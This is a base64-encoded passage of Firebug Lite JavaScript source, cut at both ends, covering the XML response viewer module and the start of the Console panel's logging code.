aWxlLnJlc3BvbnNlVGV4dCk7DQogICAgICAgIC8vL3JldHVybiBwYXJzZUpTT05TdHJpbmcoanNvblN0cmluZywgImh0dHA6Ly8iICsgZmlsZS5yZXF1ZXN0Lm9yaWdpbmFsVVJJLmhvc3QpOw0KICAgICAgICByZXR1cm4gcGFyc2VKU09OU3RyaW5nKGpzb25TdHJpbmcpOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFJlZ2lzdHJhdGlvbg0KDQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuSlNPTlZpZXdlck1vZGVsKTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9fSk7DQoNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQpGQkwubnMoZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbnN0YW50cw0KDQovLyBMaXN0IG9mIFhNTCByZWxhdGVkIGNvbnRlbnQgdHlwZXMuDQp2YXIgeG1sQ29udGVudFR5cGVzID0NClsNCiAgICAidGV4dC94bWwiLA0KICAgICJhcHBsaWNhdGlvbi94bWwiLA0KICAgICJhcHBsaWNhdGlvbi94aHRtbCt4bWwiLA0KICAgICJhcHBsaWNhdGlvbi9yc3MreG1sIiwNCiAgICAiYXBwbGljYXRpb24vYXRvbSt4bWwiLCwNCiAgICAiYXBwbGljYXRpb24vdm5kLm1vemlsbGEubWF5YmUuZmVlZCIsDQogICAgImFwcGxpY2F0aW9uL3JkZit4bWwiLA0KICAgICJhcHBsaWNhdGlvbi92bmQubW96aWxsYS54dWwreG1sIg0KXTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBNb2RlbCBpbXBsZW1lbnRhdGlvbg0KDQovKioNCiAqIEBtb2R1bGUgSW1wbGVtZW50cyB2aWV3ZXIgZm9yIFhNTCBiYXNlZCBuZXR3b3JrIHJlc3BvbnNlcy4gSW4gb3JkZXIgdG8gY3JlYXRlIGEgbmV3DQogKiB0YWIgd2loaW4gbmV0d29yayByZXF1ZXN0IGRldGFpbCwgYSBsaXN0ZW5lciBpcyByZWdpc3RlcmVkIGludG8NCiAqIDxjb2RlPkZpcmVidWcuTmV0TW9uaXRvci5OZXRJbmZvQm9keTwvY29kZT4gb2JqZWN0Lg0KICovDQpGaXJlYnVnLlhNTFZpZXdlck1vZGVsID0gZXh0ZW5kKEZpcmVidWcuTW9kdWxlLA0Kew0KICAgIGRpc3BhdGNoTmFtZTogInhtbFZpZXdlciIsDQoNCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvLy9GaXJlYnVnLkFjdGl2YWJsZU1vZHVsZS5pbml0aWFsaXplLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgICAgIEZpcmVidWcuTW9kdWxlLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgRmlyZWJ1Zy5OZXRNb25pdG9yLk5ldEluZm9Cb2R5LmFkZExpc3RlbmVyKHRoaXMpOw0KICAgIH0sDQoNCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8vRmlyZWJ1Zy5BY3RpdmFibGVNb2R1bGUuc2h1dGRvd24uYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgRmlyZWJ1Zy5Nb2R1bGUuc2h1dGRvd24uYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgRmlyZWJ1Zy5OZXRNb25pdG9yLk5ldEluZm9Cb2R5LnJlbW92ZUxpc3RlbmVyKHRoaXMpOw0KICAgIH0sDQoNCiAgICAvKioNCiAgICAgKiBDaGVjayByZXNwb25zZSdzIGNvbnRlbnQtdHlwZSBhbmQgaWYgaXQncyBhIFhNTCwgY3JlYXRlIGEgbmV3IHRhYiB3aXRoIFhNTCBwcmV2aWV3Lg0KICAgICAqLw0KICAgIGluaXRUYWJCb2R5OiBmdW5jdGlvbihpbmZvQm94LCBmaWxlKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX1hNTFZJRVdFUikNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJ4bWx2aWV3ZXIuaW5pdFRhYkJvZHkiLCBpbmZvQm94KTsNCg0KICAgICAgICAvLyBJZiB0aGUgcmVzcG9uc2UgaXMgWE1MIGxldCdzIGRpc3BsYXkgYSBwcmV0dHkgcHJldmlldy4NCiAgICAgICAgLy8vaWYgKHRoaXMuaXNYTUwoc2FmZUdldENvbnRlbnRUeXBlKGZpbGUucmVxdWVzdCkpKQ0KICAgICAgICBpZiAodGhpcy5pc1hNTChmaWxlLm1pbWVUeXBlLCBmaWxlLnJlc3BvbnNlVGV4dCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuTmV0TW9uaXRvci5OZXRJbmZvQm9keS5hcHBlbmRUYWIoaW5mb0JveCwgIlhNTCIsDQogICAgICAgICAgICAgICAgLy8vJFNUUigieG1sdmlld2VyLnRhYi5YTUwiKSk7DQogICAgICAgICAgICAgICAgJFNUUigiWE1MIikpOw0KDQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfWE1MVklFV0VSKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJ4bWx2aWV3ZXIuaW5pdFRhYkJvZHk7IFhNTCByZXNwb25zZSBhdmFpbGFibGUiKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBpc1hNTDogZnVuY3Rpb24oY29udGVudFR5cGUpDQogICAgew0KICAgICAgICBpZiAoIWNvbnRlbnRUeXBlKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIC8vIExvb2sgaWYgdGhlIHJlc3BvbnNlIGlzIFhNTCBiYXNlZC4NCiAgICAgICAgZm9yICh2YXIgaT0wOyBpPHhtbENvbnRlbnRUeXBlcy5sZW5ndGg7IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKGNvbnRlbnRUeXBlLmluZGV4T2YoeG1sQ29udGVudFR5cGVzW2ldKSA9PSAwKQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0sDQoNCiAgICAvKioNCiAgICAgKiBQYXJzZSBYTUwgcmVzcG9uc2UgYW5kIHJlbmRlciBwcmV0dHkgcHJpbnRlZCBwcmV2aWV3Lg0KICAgICAqLw0KICAgIHVwZGF0ZVRhYkJvZHk6IGZ1bmN0aW9uKGluZm9Cb3gsIGZpbGUsIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgdGFiID0gaW5mb0JveC5zZWxlY3RlZFRhYjsNCiAgICAgICAgLy8vdmFyIHRhYkJvZHkgPSBpbmZvQm94LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEluZm9YTUxUZXh0IikuaXRlbSgwKTsNCiAgICAgICAgdmFyIHRhYkJvZHkgPSAkJCgiLm5ldEluZm9YTUxUZXh0IiwgaW5mb0JveClbMF07DQogICAgICAgIGlmICghaGFzQ2xhc3ModGFiLCAibmV0SW5mb1hNTFRhYiIpIHx8IHRhYkJvZHkudXBkYXRlZCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB0YWJCb2R5LnVwZGF0ZWQgPSB0cnVlOw0KDQogICAgICAgIHRoaXMuaW5zZXJ0WE1MKHRhYkJvZHksIEZpcmVidWcuTmV0TW9uaXRvci5VdGlscy5nZXRSZXNwb25zZVRleHQoZmlsZSwgY29udGV4dCkpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRYTUw6IGZ1bmN0aW9uKHBhcmVudE5vZGUsIHRleHQpDQogICAgew0KICAgICAgICB2YXIgeG1sVGV4dCA9IHRleHQucmVwbGFjZSgvXlxzKjw/Lis/PlxzKi8sICIiKTsNCiAgICAgICAgDQogICAgICAgIHZhciBkaXYgPSBwYXJlbnROb2RlLm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIGRpdi5pbm5lckhUTUwgPSB4bWxUZXh0Ow0KICAgICAgICANCiAgICAgICAgdmFyIHJvb3QgPSBkaXYuZ2V0RWxlbWVudHNCeVRhZ05hbWUoIioiKVswXTsNCiAgICANCiAgICAgICAgLyoqKg0KICAgICAgICB2YXIgcGFyc2VyID0gQ0NJTigiQG1vemlsbGEub3JnL3htbGV4dHJhcy9kb21wYXJzZXI7MSIsICJuc0lET01QYXJzZXIiKTsNCiAgICAgICAgdmFyIGRvYyA9IHBhcnNlci5wYXJzZUZyb21TdHJpbmcodGV4dCwgInRleHQveG1sIik7DQogICAgICAgIHZhciByb290ID0gZG9jLmRvY3VtZW50RWxlbWVudDsNCg0KICAgICAgICAvLyBFcnJvciBoYW5kbGluZw0KICAgICAgICB2YXIgbnNVUkkgPSAiaHR0cDovL3d3dy5tb3ppbGxhLm9yZy9uZXdsYXlvdXQveG1sL3BhcnNlcmVycm9yLnhtbCI7DQogICAgICAgIGlmIChyb290Lm5hbWVzcGFjZVVSSSA9PSBuc1VSSSAmJiByb290Lm5vZGVOYW1lID09ICJwYXJzZXJlcnJvciIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuUGFyc2VFcnJvci50YWcucmVwbGFjZSh7ZXJyb3I6IHsNCiAgICAgICAgICAgICAgICBtZXNzYWdlOiByb290LmZpcnN0Q2hpbGQubm9kZVZhbHVlLA0KICAgICAgICAgICAgICAgIHNvdXJjZTogcm9vdC5sYXN0Q2hpbGQudGV4dENvbnRlbnQNCiAgICAgICAgICAgIH19LCBwYXJlbnROb2RlKTsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICAvKiovDQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX1hNTFZJRVdFUikNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJ4bWx2aWV3ZXIudXBkYXRlVGFiQm9keTsgWE1MIHJlc3BvbnNlIHBhcnNlZCIsIGRvYyk7DQoNCiAgICAgICAgLy8gT3ZlcnJpZGUgZ2V0SGlkZGVuIGluIHRoZXNlIHRlbXBsYXRlcy4gVGhlIHBhcnNlZCBYTUwgZG9jdW1lbiBpcw0KICAgICAgICAvLyBoaWRkZW4sIGJ1dCB3ZSB3YW50IHRvIGRpc3BsYXkgaXQgdXNpbmcgJ3Zpc2libGUnIHN0eWxpbmcuDQogICAgICAgIC8qDQogICAgICAgIHZhciB0ZW1wbGF0ZXMgPSBbDQogICAgICAgICAgICBGaXJlYnVnLkhUTUxQYW5lbC5Db21wbGV0ZUVsZW1lbnQsDQogICAgICAgICAgICBGaXJlYnVnLkhUTUxQYW5lbC5FbGVtZW50LA0KICAgICAgICAgICAgRmlyZWJ1Zy5IVE1MUGFuZWwuVGV4dEVsZW1lbnQsDQogICAgICAgICAgICBGaXJlYnVnLkhUTUxQYW5lbC5FbXB0eUVsZW1lbnQsDQogICAgICAgICAgICBGaXJlYnVnLkhUTUxQYW5lbC5YRW1wdHlFbGVtZW50LA0KICAgICAgICBdOw0KDQogICAgICAgIHZhciBvcmlnaW5hbHMgPSBbXTsNCiAgICAgICAgZm9yICh2YXIgaT0wOyBpPHRlbXBsYXRlcy5sZW5ndGg7IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgb3JpZ2luYWxzW2ldID0gdGVtcGxhdGVzW2ldLmdldEhpZGRlbjsNCiAgICAgICAgICAgIHRlbXBsYXRlc1tpXS5nZXRIaWRkZW4gPSBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gIiI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgLyoqLw0KDQogICAgICAgIC8vIEdlbmVyYXRlIFhNTCBwcmV2aWV3Lg0KICAgICAgICAvLy9GaXJlYnVnLkhUTUxQYW5lbC5Db21wbGV0ZUVsZW1lbnQudGFnLnJlcGxhY2Uoe29iamVjdDogZG9jLmRvY3VtZW50RWxlbWVudH0sIHBhcmVudE5vZGUpOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gaHRtbDMNCiAgICAgICAgLy8vRmlyZWJ1Zy5IVE1MUGFuZWwuQ29tcGxldGVFbGVtZW50LnRhZy5yZXBsYWNlKHtvYmplY3Q6IHJvb3R9LCBwYXJlbnROb2RlKTsNCiAgICAgICAgdmFyIGh0bWwgPSBbXTsNCiAgICAgICAgRmlyZWJ1Zy5SZXBzLmFwcGVuZE5vZGUocm9vdCwgaHRtbCk7DQogICAgICAgIHBhcmVudE5vZGUuaW5uZXJIVE1MID0gaHRtbC5qb2luKCIiKTsNCiAgICAgICAgDQoNCiAgICAgICAgLyoNCiAgICAgICAgZm9yICh2YXIgaT0wOyBpPG9yaWdpbmFscy5sZW5ndGg7IGkrKykNCiAgICAgICAgICAgIHRlbXBsYXRlc1tpXS5nZXRIaWRkZW4gPSBvcmlnaW5hbHNbaV07LyoqLw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIERvbXBsYXRlDQoNCi8qKg0KICogQGRvbXBsYXRlIFJlcHJlc2VudHMgYSB0ZW1wbGF0ZSBmb3IgZGlzcGxheWluZyBYTUwgcGFyc2VyIGVycm9ycy4gVXNlZCBieQ0KICogPGNvZGU+RmlyZWJ1Zy5YTUxWaWV3ZXJNb2RlbDwvY29kZT4uDQogKi8NCkZpcmVidWcuWE1MVmlld2VyTW9kZWwuUGFyc2VFcnJvciA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgRElWKHsiY2xhc3MiOiAieG1sSW5mb0Vycm9yIn0sDQogICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJ4bWxJbmZvRXJyb3JNc2cifSwgIiRlcnJvci5tZXNzYWdlIiksDQogICAgICAgICAgICBQUkUoeyJjbGFzcyI6ICJ4bWxJbmZvRXJyb3JTb3VyY2UifSwgIiRlcnJvcnxnZXRTb3VyY2UiKQ0KICAgICAgICApLA0KDQogICAgZ2V0U291cmNlOiBmdW5jdGlvbihlcnJvcikNCiAgICB7DQogICAgICAgIHZhciBwYXJ0cyA9IGVycm9yLnNvdXJjZS5zcGxpdCgiXG4iKTsNCiAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCAhPSAyKQ0KICAgICAgICAgICAgcmV0dXJuIGVycm9yLnNvdXJjZTsNCg0KICAgICAgICB2YXIgbGltaXQgPSA1MDsNCiAgICAgICAgdmFyIGNvbHVtbiA9IHBhcnRzWzFdLmxlbmd0aDsNCiAgICAgICAgaWYgKGNvbHVtbiA+PSBsaW1pdCkgew0KICAgICAgICAgICAgcGFydHNbMF0gPSAiLi4uIiArIHBhcnRzWzBdLnN1YnN0cihjb2x1bW4gLSBsaW1pdCk7DQogICAgICAgICAgICBwYXJ0c1sxXSA9ICIuLi4iICsgcGFydHNbMV0uc3Vic3RyKGNvbHVtbiAtIGxpbWl0KTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChwYXJ0c1swXS5sZW5ndGggPiA4MCkNCiAgICAgICAgICAgIHBhcnRzWzBdID0gcGFydHNbMF0uc3Vic3RyKDAsIDgwKSArICIuLi4iOw0KDQogICAgICAgIHJldHVybiBwYXJ0cy5qb2luKCJcbiIpOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFJlZ2lzdHJhdGlvbg0KDQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuWE1MVmlld2VyTW9kZWwpOw0KDQp9fSk7DQoNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQovLyBuZXh0LWdlbmVyYXRpb24gQ29uc29sZSBQYW5lbCAod2lsbCBvdmVycmlkZSBjb25zb2plLmpzKQ0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbnN0YW50cw0KDQovKg0KY29uc3QgQ2MgPSBDb21wb25lbnRzLmNsYXNzZXM7DQpjb25zdCBDaSA9IENvbXBvbmVudHMuaW50ZXJmYWNlczsNCmNvbnN0IG5zSVByZWZCcmFuY2gyID0gQ2kubnNJUHJlZkJyYW5jaDI7DQpjb25zdCBQcmVmU2VydmljZSA9IENjWyJAbW96aWxsYS5vcmcvcHJlZmVyZW5jZXMtc2VydmljZTsxIl07DQpjb25zdCBwcmVmcyA9IFByZWZTZXJ2aWNlLmdldFNlcnZpY2UobnNJUHJlZkJyYW5jaDIpOw0KLyoqLw0KLyoNCg0KLy8gbmV3IG9mZmxpbmUgbWVzc2FnZSBoYW5kbGVyDQpvID0ge3g6MSx5OjJ9Ow0KDQpyID0gRmlyZWJ1Zy5nZXRSZXAobyk7DQoNCnIudGFnLnRhZy5jb21waWxlKCk7DQoNCm91dHB1dHMgPSBbXTsNCmh0bWwgPSByLnRhZy5yZW5kZXJIVE1MKHtvYmplY3Q6b30sIG91dHB1dHMpOw0KDQoNCi8vIGZpbmlzaCByZW5kZXJpbmcgdGhlIHRlbXBsYXRlICh0aGUgRE9NIHBhcnQpDQp0YXJnZXQgPSAkKCJidWlsZCIpOw0KdGFyZ2V0LmlubmVySFRNTCA9IGh0bWw7DQpyb290ID0gdGFyZ2V0LmZpcnN0Q2hpbGQ7DQoNCmRvbUFyZ3MgPSBbcm9vdCwgci50YWcuY29udGV4dCwgMF07DQpkb21BcmdzLnB1c2guYXBwbHkoZG9tQXJncywgci50YWcuZG9tQXJncyk7DQpkb21BcmdzLnB1c2guYXBwbHkoZG9tQXJncywgb3V0cHV0cyk7DQpyLnRhZy50YWcucmVuZGVyRE9NLmFwcGx5KHNlbGYgPyBzZWxmIDogci50YWcuc3ViamVjdCwgZG9tQXJncyk7DQoNCg0KICovDQp2YXIgY29uc29sZVF1ZXVlID0gW107DQp2YXIgbGFzdEhpZ2hsaWdodGVkT2JqZWN0Ow0KdmFyIEZpcmVidWdDb250ZXh0ID0gRW52LmJyb3dzZXI7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp2YXIgbWF4UXVldWVSZXF1ZXN0cyA9IDUwMDsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZpcmVidWcuQ29uc29sZUJhc2UgPQ0Kew0KICAgIGxvZzogZnVuY3Rpb24ob2JqZWN0LCBjb250ZXh0LCBjbGFzc05hbWUsIHJlcCwgbm9UaHJvdHRsZSwgc291cmNlTGluaykNCiAgICB7DQogICAgICAgIC8vZGlzcGF0Y2godGhpcy5mYkxpc3RlbmVycywibG9nIixbY29udGV4dCwgb2JqZWN0LCBjbGFzc05hbWUsIHNvdXJjZUxpbmtdKTsNCiAgICAgICAgcmV0dXJuIHRoaXMubG9nUm93KGFwcGVuZE9iamVjdCwgb2JqZWN0LCBjb250ZXh0LCBjbGFzc05hbWUsIHJlcCwgc291cmNlTGluaywgbm9UaHJvdHRsZSk7DQogICAgfSwNCg0KICAgIGxvZ0Zvcm1hdHRlZDogZnVuY3Rpb24ob2JqZWN0cywgY29udGV4dCwgY2xhc3NOYW1lLCBub1Rocm90dGxlLCBzb3VyY2VMaW5rKQ0KICAgIHsNCiAgICAgICAgLy9kaXNwYXRjaCh0aGlzLmZiTGlzdGVuZXJzLCJsb2dGb3JtYXR0ZWQiLFtjb250ZXh0LCBvYmplY3RzLCBjbGFzc05hbWUsIHNvdXJjZUxpbmtdKTsNCiAgICAgICAgcmV0dXJuIHRoaXMubG9nUm93KGFwcGVuZEZvcm1hdHRlZCwgb2JqZWN0cywgY29udGV4dCwgY2xhc3NOYW1lLCBudWxsLCBzb3VyY2VMaW5rLCBub1Rocm90dGxlKTsNCiAgICB9LA0KDQogICAgb3Blbkdyb3VwOiBmdW5jdGlvbihvYmplY3RzLCBjb250ZXh0LCBjbGFzc05hbWUsIHJlcCwgbm9UaHJvdHRsZSwgc291cmNlTGluaywgbm9QdXNoKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHRoaXMubG9nUm93KGFwcGVuZE9wZW5Hcm91cCwgb2JqZWN0cywgY29udGV4dCwgY2xhc3NOYW1lLCByZXAsIHNvdXJjZUxpbmssIG5vVGhyb3R0bGUpOw0KICAgIH0sDQoNCiAgICBjbG9zZUdyb3VwOiBmdW5jdGlvbihjb250ZXh0LCBub1Rocm90dGxlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHRoaXMubG9nUm93KGFwcGVuZENsb3NlR3JvdXAsIG51bGwsIGNvbnRleHQsIG51bGwsIG51bGwsIG51bGwsIG5vVGhyb3R0bGUsIHRydWUpOw0KICAgIH0sDQoNCiAgICBsb2dSb3c6IGZ1bmN0aW9uKGFwcGVuZGVyLCBvYmplY3RzLCBjb250ZXh0LCBjbGFzc05hbWUsIHJlcCwgc291cmNlTGluaywgbm9UaHJvdHRsZSwgbm9Sb3cpDQogICAgew0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBjb25zb2xlIGNvbnNvbGUyDQogICAgICAgIG5vVGhyb3R0bGUgPSB0cnVlOyAvLyB4eHhwZWRybyBmb3JjZWQgYmVjYXVzZSB0aGVyZSBpcyBubyBUYWJDb250ZXh0IHlldA0KICAgICAgICANCiAgICAgICAgaWYgKCFjb250ZXh0KQ0KICAgICAgICAgICAgY29udGV4dCA9IEZpcmVidWdDb250ZXh0Ow0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19FUlJPUlMgJiYgIWNvbnRleHQpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiQ29uc29sZS5sb2dSb3cgaGFzIG5vIGNvbnRleHQsIHNraXBwaW5nIG9iamVjdHMiLCBvYmplY3RzKTsNCg0KICAgICAgICBpZiAoIWNvbnRleHQpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgaWYgKG5vVGhyb3R0bGUgfHwgIWNvbnRleHQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYW5lbCA9IHRoaXMuZ2V0UGFuZWwoY29udGV4dCk7DQogICAgICAgICAgICBpZiAocGFuZWwpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHJvdyA9IHBhbmVsLmFwcGVuZChhcHBlbmRlciwgb2JqZWN0cywgY2xhc3NOYW1lLCByZXAsIHNvdXJjZUxpbmssIG5vUm93KTsNCiAgICAgICAgICAgICAgICB2YXIgY29udGFpbmVyID0gcGFuZWwucGFuZWxOb2RlOw0KDQogICAgICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gd2hhdCBpcyB0aGlzPyBjb25zb2xlIGNvbnNvbGUyDQogICAgICAgICAgICAgICAgLyoNCiAgICAgICAgICAgICAgICB2YXIgdGVtcGxhdGUgPSBGaXJlYnVnLk5ldE1vbml0b3IuTmV0TGltaXQ7DQoNCiAgICAgICAgICAgICAgICB3aGlsZSAoY29udGFpbmVyLmNoaWxkTm9kZXMubGVuZ3RoID4gbWF4UXVldWVSZXF1ZXN0cyArIDEpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjbGVhckRvbXBsYXRlKGNvbnRhaW5lci5maXJzdENoaWxkLm5leHRTaWJsaW5nKTsNCiAgICAgICAgICAgICAgICAgICAgY29udGFpbmVyLnJlbW92ZUNoaWxkKGNvbnRhaW5lci5maXJzdENoaWxkLm5leHRTaWJsaW5nKTsNCiAgICAgICAgICAgICAgICAgICAgcGFuZWwubGltaXQubGltaXRJbmZvLnRvdGFsQ291bnQrKzsNCiAgICAgICAgICAgICAgICAgICAgdGVtcGxhdGUudXBkYXRlQ291bnRlcihwYW5lbC5saW1pdCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGRpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICJvbkxvZ1Jvd0NyZWF0ZWQiLCBbcGFuZWwgLCByb3ddKTsNCiAgICAgICAgICAgICAgICAvKiovDQogICAgICAgICAgICAgICAgcmV0dXJuIHJvdzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlUXVldWUucHVzaChbYXBwZW5kZXIsIG9iamVjdHMsIGNvbnRleHQsIGNsYXNzTmFtZSwgcmVwLCBzb3VyY2VMaW5rLCBub1Rocm90dGxlLCBub1Jvd10pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCFjb250ZXh0LnRocm90dGxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vRkJUcmFjZS5zeXNvdXQoImNvbnNvbGUubG9nUm93IGhhcyBub3QgY29udGV4dC50aHJvdHRsZSEgIik7DQogICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgdmFyIGFyZ3MgPSBbYXBwZW5kZXIsIG9iamVjdHMsIGNvbnRleHQsIGNsYXNzTmFtZSwgcmVwLCBzb3VyY2VMaW5rLCB0cnVlLCBub1Jvd107DQogICAgICAgICAgICBjb250ZXh0LnRocm90dGxlKHRoaXMubG9nUm93LCB0aGlzLCBhcmdzKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBhcHBlbmRGb3JtYXR0ZWQ6IGZ1bmN0aW9uKGFyZ3MsIHJvdywgY29udGV4dCkNCiAgICB7DQogICAgICAgIGlmICghY29udGV4dCkNCiAgICAgICAgICAgIGNvbnRleHQgPSBGaXJlYnVnQ29udGV4dDsNCg0KICAgICAgICB2YXIgcGFuZWwgPSB0aGlzLmdldFBhbmVsKGNvbnRleHQpOw0KICAgICAgICBwYW5lbC5hcHBlbmRGb3JtYXR0ZWQoYXJncywgcm93KTsNCiAgICB9LA0KDQogICAgY2xlYXI6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgICAgICBpZiAoIWNvbnRleHQpDQogICAgICAgICAgICAvL2NvbnRleHQgPSBGaXJlYnVnQ29udGV4dDsNCiAgICAgICAgICAgIGNvbnRleHQgPSBGaXJlYnVnLmNvbnRleHQ7DQoNCiAgICAgICAgLyoNCiAgICAgICAgaWYgKGNvbnRleHQpDQogICAgICAgICAgICBGaXJlYnVnLkVycm9ycy5jbGVhcihjb250ZXh0KTsNCiAgICAgICAgLyoqLw0KICAgICAgICANCiAgICAgICAgdmFyIHBhbmVsID0gdGhpcy5nZXRQYW5lbChjb250ZXh0LCB0cnVlKTsNCiAgICAgICAgaWYgKHBhbmVsKQ0KICAgICAgICB7DQogICAgICAgICAgICBwYW5lbC5jbGVhcigpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8vIE92ZXJyaWRlIHRvIGRpcmVjdCBvdXRwdXQgdG8geW91ciBwYW5lbA0KICAgIGdldFBhbmVsOiBmdW5jdGlvbihjb250ZXh0LCBub0NyZWF0ZSkNCiAgICB7DQogICAgICAgIC8vcmV0dXJuIGNvbnRleHQuZ2V0UGFuZWwoImNvbnNvbGUiLCBub0NyZWF0ZSk7DQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIGNvbnNvbGUgY29uc29sZTINCiAgICAgICAgcmV0dXJuIEZpcmVidWcuY2hyb21lID8gRmlyZWJ1Zy5jaHJvbWUuZ2V0UGFuZWwoIkNvbnNvbGUiKSA6IG51bGw7DQogICAgfQ0KDQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy9UT0RPOiB4eHhwZWRybw0KLy92YXIgQWN0aXZhYmxlQ29uc29sZSA9IGV4dGVuZChGaXJlYnVnLkFjdGl2YW